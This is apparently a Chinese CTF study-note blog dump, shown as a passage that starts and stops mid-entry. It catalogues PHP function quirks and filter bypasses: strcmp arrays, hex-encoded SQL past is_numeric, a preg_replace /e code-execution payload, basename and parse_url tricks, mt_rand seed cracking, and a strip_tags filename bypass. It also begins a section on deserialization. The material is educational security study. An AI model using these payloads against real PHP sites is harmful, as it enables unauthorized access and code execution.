( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br><span class="line">如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span>。(区分大小写)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">但是<span class="title function_ invoke__">strcmp</span>()比较的对象是字符串和数组的时候，虽然会报错，但是仍然会直接返回<span class="number">0</span>，这样通过把目标变量设置成数组就可以绕过该函数的限制。</span><br><span class="line"><span class="comment">#php7.0</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="variable">$password</span>))<span class="comment">//字符串与数组进行比较</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;Warning: <span class="title function_ invoke__">strcmp</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /usercode/file.php on line <span class="number">3</span></span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><h2 id="intval-–php5"><a href="#intval-–php5" class="headerlink" title="intval()–php5"></a>intval()–php5</h2><p><img src="/../images/image-20220922202838221-1687432076954.png" alt="image-20220922202838221"></p><h2 id="is-numeric（）"><a href="#is-numeric（）" class="headerlink" title="is_numeric（）"></a>is_numeric（）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  <span class="comment">//是 values($s) 不是values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">上面这个片段程序是判断参数s是否为数字，是则返回数字，不是则返回<span class="number">0</span>，然后带入数据库查询。（这样就构造不了sql语句）</span><br><span class="line">我们可以把‘<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="string">&#x27; 转换为16进制 0x31206f722031 为s参数的值</span></span><br><span class="line"><span class="string">l</span></span><br></pre></td></tr></table></figure><h2 id="array-search-x2F-in-array"><a href="#array-search-x2F-in-array" class="headerlink" title="array_search&#x2F;in_array"></a>array_search&#x2F;in_array</h2><blockquote><p>大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较。</p></blockquote><p>参数：(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$needle</code>, array <code>$haystack</code>, bool <code>$strict</code> &#x3D; <strong><code>false</code></strong>): bool</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当模式为<span class="literal">false</span>时，其查找是通过==来比较的</span><br><span class="line"></span><br><span class="line">当模式为<span class="literal">true</span>时，其查找是通过===来比较的</span><br></pre></td></tr></table></figure><h2 id="escapeshellarg和escapeshellcmd"><a href="#escapeshellarg和escapeshellcmd" class="headerlink" title="escapeshellarg和escapeshellcmd"></a>escapeshellarg和escapeshellcmd</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p><p><a href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p><h2 id="preg"><a href="#preg" class="headerlink" title="preg"></a>preg</h2><h4 id="preg-match（正则表达式，待匹配字符串，捕获分组）"><a href="#preg-match（正则表达式，待匹配字符串，捕获分组）" class="headerlink" title="preg-match（正则表达式，待匹配字符串，捕获分组）"></a>preg-match（正则表达式，待匹配字符串，捕获分组）</h4><blockquote><p>**preg_match()<strong>返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为</strong>preg_match()**在第一次匹配后 将会停止搜索。</p></blockquote><p>漏洞</p><p>1.参数为字符串，传递数组返回false</p><p>2.<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">利用PCRE回溯次数限制绕过</a></p><p>php低版本</p><p>2.非&#x2F;s模式下不匹配换行符%0a<br>3.非&#x2F;m模式下不匹配多行</p><h4 id="preg-replace（正则表达式，替换字符，待匹配字符串，替换次数）"><a href="#preg-replace（正则表达式，替换字符，待匹配字符串，替换次数）" class="headerlink" title="preg_replace（正则表达式，替换字符，待匹配字符串，替换次数）"></a>preg_replace（正则表达式，替换字符，待匹配字符串，替换次数）</h4><ol><li><p>替换次数默认为1，可以用双写绕过</p></li><li><p>&#x2F;e模式下的代码执行 （php5.5版本以下）</p></li></ol><p>buu–[BJDCTF2020]ZJCTF，不过如此</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"><span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>.<span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在&#x2F;e模式下，如果正则匹配成功，就会执行preg_replace()的第二个参数</p><p>相当于 <strong>eval(‘strtolower(“\1”);’)</strong> </p><p>如何利用\1实现代码执行呢？</p><p>注意到第一个参数所代表的正则表达式，是将匹配到的字符作为捕获分组，而捕获分组下标是从1开始的，即匹配到的字符会代替\1→<strong>eval(‘strtolower(“payload”);’)</strong> </p><p><img src="file://E:\typora%20img\image-20220706125956030.png?lastModify=1657113567" alt="image-20220706125956030"></p><p>还有一个注意点是”payload”是由双引号包围起来的，再配合可变变量，才能够执行任意代码。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125; </span><br><span class="line"></span><br><span class="line">\S*→<span class="variable">$regex</span> 用于正则匹配/捕获</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;→<span class="variable">$value</span> 待匹配字符</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;:要将待匹配字符构造成可变变量的形式才可以执行<span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">可变变量：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt; hello world</span><br></pre></td></tr></table></figure><h2 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h2><p><strong>basename会忽略一些奇怪的字符<code>%80 ~ %ff</code>。</strong></p><p>buu —-[Zer0pts2020]Can you guess it?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;config\.php\/*$&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标：basename($_SERVER[‘PHP_SELF’]&#x3D;&#x3D;config.php</p><ol><li>需要绕过过滤config.php/*$，$匹配末尾，所以只要在config.php后添加字符即可绕过。</li><li>$_SERVER[‘PHP_SELF’]：返回的是当前文件相对于根目录的路径host&#x2F;$_SERVER[“PHP_SELF”]即url&#x3D;&#x3D;host&#x2F;$_SERVER[“PHP_SELF”]</li><li>basename：返回当前文件名即最后一个&#x2F;xxx中的xxx</li></ol><p><img src="/../images/image-20220706205913114-1687432076955.png" alt="image-20220706205913114"></p><p>为了绕过正则，需要在1.php后加字符</p><p><img src="/../images/image-20220706210043797-1687432076955.png" alt="image-20220706210043797"></p><p>但是这样basename匹配到的就不是1.php了</p><p>不过basename有一个特性就是：如果匹配到的文件名头是不可打印字符，会把它忽略掉</p><p><img src="/../images/image-20220706210252351-1687432076955.png" alt="image-20220706210252351"></p><p>这样basename原先匹配到的是%81，但是%81是不可打印字符，会把它忽略掉，所以就会往前匹配，匹配到1.php</p><p><img src="/../images/image-20220706210555229-1687432076955.png" alt="image-20220706210555229"></p><h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand(x):设定随机数种子为x</span><br><span class="line">mt_rand(a,b):生成[a,b]间的随机数</span><br></pre></td></tr></table></figure><p>随机数生成函数，实质上生成的是线性的伪随机数，简单来说就是y&#x3D;ax，x就是种子，a是范围，y就是生成的随机数。</p><p>所以只要种子固定了，每次生成的随机数都是相同的。</p><ol><li><p>已知在同一个种子下生成的多个随机数</p><p><a href="https://blog.csdn.net/weixin_34255793/article/details/92713300">https://blog.csdn.net/weixin_34255793/article/details/92713300</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用php_mt_seed对第一个随机数进行爆破，得到可能的种子（因为第一次调用mt_rand()函数的时候种子就确定下来了）</span><br><span class="line">然后用得到的种子来生成随机数，进行比对即可得到正确的种子</span><br></pre></td></tr></table></figure></li><li><p>已知第一个随机数</p><p><a href="https://blog.csdn.net/qq_52907838/article/details/119824220">https://blog.csdn.net/qq_52907838/article/details/119824220</a></p><p>php_mt_seed中给出的方法</p><p><img src="/../images/image-20220708120301114-1687432076956.png" alt="image-20220708120301114"></p><p>对应脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;Unclt9Kr75&quot;</span>;<span class="comment">//第一个随机数的前十位</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$length</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass_now</span> = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;<span class="comment">//完整的随机数</span></span><br><span class="line"><span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$allowable_characters</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$length</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$a</span> &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220708120520631-1687432076956.png" alt="image-20220708120520631"></p><p>关于php_mt_seed <a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p><h2 id="SERVER变量缺陷"><a href="#SERVER变量缺陷" class="headerlink" title="$_SERVER变量缺陷"></a>$_SERVER变量缺陷</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER[QUERY_STRING]  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_SERVER  &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220717130225205-1687432076956.png" alt="image-20220717130225205"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;]：返回的是当前文件相对于根目录的路径host/$_SERVER[&quot;PHP_SELF&quot;]即url==host/$_SERVER[&quot;PHP_SELF&quot;]</span><br></pre></td></tr></table></figure><h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>使用方法</p><blockquote><p>用于解析url，获得url的组成部分</p></blockquote><p><img src="/../images/image-20220204213349476-1687432076956.png" alt="image-20220204213349476"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.zcool.com.cn/suning?p=69#tab_anchor&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$parts</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">http:<span class="comment">//www.zcool.com.cn/suning?p=69#tab_anchor&lt;/br&gt;array(5) &#123;</span></span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;www.zcool.com.cn&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;/suning&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;p=69&quot;</span></span><br><span class="line">  [<span class="string">&quot;fragment&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;tab_anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞</p><blockquote><p>不应该将其作为检验url是否合法的手段</p></blockquote><ol><li><p>解析失败</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/test/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807105935728-1687432076957.png" alt="image-20220807105935728"></p><blockquote><p>我们查询的字符串被拦截，没有输出a&#x3D;1</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1///test/1.php?aaa=1</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807111314350-1687432076957.png" alt="image-20220807111314350"></p><blockquote><p>在正常路径前加上&#x2F;&#x2F;，parse_url就会解析失败，从而绕过过滤，成功输出a&#x3D;1</p></blockquote></li><li><p>端口解析错误</p><blockquote><p>php5.5以上</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;//pupiles.com/about:1234&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>parse_url解析出了端口号，认为访问的是pupiles.com的1234端口下的about:1234文件，而实际上是访问pupiles.com下的about:1234文件</p></blockquote></li><li><p>路径解析错误</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$uri</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">)</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>可以看到parse_url解析时，&#x2F;xxx解析为路径，&#x2F;&#x2F;xxx解析为主机</p></blockquote></li></ol><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>伪协议  is_file检测除了file外的伪协议都是false    </li><li>假目录   <code>./xxx/../f14g.php </code></li></ul><h2 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]  = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="number">1</span>.&lt;&gt;php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><ul><li>序列化是将对象转化为数据字节流，反序列化是将数据字节流转换成对象。例如java采用二进制序列，PHP采用可见字符串序列。</li><li>PHP反序列化漏洞主要发生在反序列化期间一些魔术方法的自动调用上</li></ul><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="非类序列化"><a href="#非类序列化" class="headerlink" title="非类序列化"></a>非类序列化</h2><p>相比于类序列化少了对象名长度和对象名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="类序列化"><a href="#类序列化" class="headerlink" title="类序列化"></a>类序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>可以发现序列化时只会序列化类的属性，而不会序列化类的方法。</p></blockquote><h3 id="类属性权限对序列化的影响"><a href="#类属性权限对序列化的影响" class="headerlink" title="类属性权限对序列化的影响"></a>类属性权限对序列化的影响</h3><figure class="highlight php"><table><tr><td class="code"><pre><span 